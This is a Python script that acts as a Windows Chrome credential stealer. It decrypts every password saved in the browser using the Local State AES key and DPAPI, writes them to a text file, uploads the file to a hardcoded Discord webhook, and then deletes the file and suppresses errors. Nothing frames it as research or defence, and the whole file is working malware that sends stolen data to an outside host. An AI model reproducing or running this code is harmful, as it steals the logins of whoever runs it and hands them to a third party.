
import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import requests
import json

webhook_url = 'https://discord.com/api/webhooks/1084092054717595709/e_n-Q0N0hSc_vfK8Ifd4hNTICXkDAuJtbinWSa3kIkZ81jGB6zKXc7FC1FcdhYkJ7HmS'
username = os.getlogin()

path = "C:\\Users\\"+username + \
    "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"

conn = sqlite3.connect(path)
cursor = conn.cursor()

cursor.execute("SELECT origin_url, username_value, password_value FROM logins")


def fetching_encryption_key():
    local_computer_directory_path = os.path.join(
        os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome",
        "User Data", "Local State")

    with open(local_computer_directory_path, "r", encoding="utf-8") as f:
        local_state_data = f.read()
        local_state_data = json.loads(local_state_data)

    encryption_key = base64.b64decode(
        local_state_data["os_crypt"]["encrypted_key"])

    encryption_key = encryption_key[5:]

    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]


def password_decryption(password, encryption_key):
    try:
        iv = password[3:15]
        password = password[15:]

        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)

        return cipher.decrypt(password)[:-16].decode()
    except:

        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "No Passwords"


for row in cursor.fetchall():
    try:
        password = win32crypt.CryptUnprotectData(
            row[2], None, None, None, 0)[1]
        password = password.decode("utf-8")
    except Exception as e:
        password = "Could not decrypt password"

    if not isinstance(password, str):
        password = str(password, 'utf-8')

    key = fetching_encryption_key()
    decrypted_password = password_decryption(row[2], key)
    with open("passwords.txt", "a") as f:
        f.write("Website: " + row[0] + "\n")
        f.write("Username: " + row[1] + "\n")
        f.write("Password: " + decrypted_password + "\n\n\n===================================\n\n")
conn.close()
try:
    file = open("passwords.txt", "rb")

    payload = {"content": "Password file: "}
    files = {"file": ("passwords.txt", file)}

    response = requests.post(webhook_url, data=payload, files=files)

    file.close()
    os.remove("passwords.txt")
except:
    pass
